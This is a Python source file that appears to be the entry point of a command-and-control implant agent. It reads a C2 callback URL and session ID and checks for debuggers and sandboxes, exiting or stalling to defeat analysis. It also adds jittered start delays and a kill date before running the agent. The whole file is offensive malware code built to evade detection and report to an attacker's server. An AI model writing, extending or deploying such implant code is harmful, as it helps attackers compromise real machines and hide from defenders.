#!/usr/bin/env python3
"""
C2 Agent main entry point
"""

import os
import sys
import time
import random
import argparse
import json
from datetime import datetime

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.agent import Agent
from core.config import Config
from evasion.anti_debugging import AntiDebugging
from evasion.sandbox_detection import SandboxDetection

def load_config(config_file: str = None) -> Config:
    """Load agent configuration"""
    config = Config()
    
    # Load from file if provided
    if config_file and os.path.exists(config_file):
        with open(config_file, 'r') as f:
            config_data = json.load(f)
            config.update(config_data)
    
    # Override with environment variables
    if os.environ.get('C2_CALLBACK_URL'):
        config.callback_url = os.environ['C2_CALLBACK_URL']
    if os.environ.get('C2_SESSION_ID'):
        config.session_id = os.environ['C2_SESSION_ID']
    
    return config

def main():
    """Main agent entry point"""
    parser = argparse.ArgumentParser(description='C2 Agent')
    parser.add_argument('-c', '--config', help='Configuration file')
    parser.add_argument('-d', '--debug', action='store_true', help='Debug mode')
    parser.add_argument('--no-evasion', action='store_true', help='Disable evasion techniques')
    
    args = parser.parse_args()
    
    # Load configuration
    config = load_config(args.config)
    
    # Apply evasion techniques unless disabled
    if not args.no_evasion and not args.debug:
        # Check for debuggers
        if AntiDebugging.is_debugger_present():
            sys.exit(1)
        
        # Check for sandbox
        sandbox_detector = SandboxDetection()
        if sandbox_detector.is_sandbox():
            # Sleep and exit to waste sandbox time
            time.sleep(random.randint(60, 300))
            sys.exit(0)
    
    # Create and run agent
    agent = Agent(config)
    
    try:
        # Initial delay with jitter
        if config.initial_delay > 0:
            delay = config.initial_delay + random.randint(0, config.jitter)
            time.sleep(delay)
        
        # Check kill date
        if config.kill_date:
            kill_date = datetime.fromisoformat(config.kill_date)
            if datetime.now() > kill_date:
                sys.exit(0)
        
        # Run agent
        agent.run()
        
    except KeyboardInterrupt:
        if args.debug:
            print("\nAgent stopped by user")
    except Exception as e:
        if args.debug:
            print(f"Agent error: {e}")
            import traceback
            traceback.print_exc()

if __name__ == "__main__":
    main()
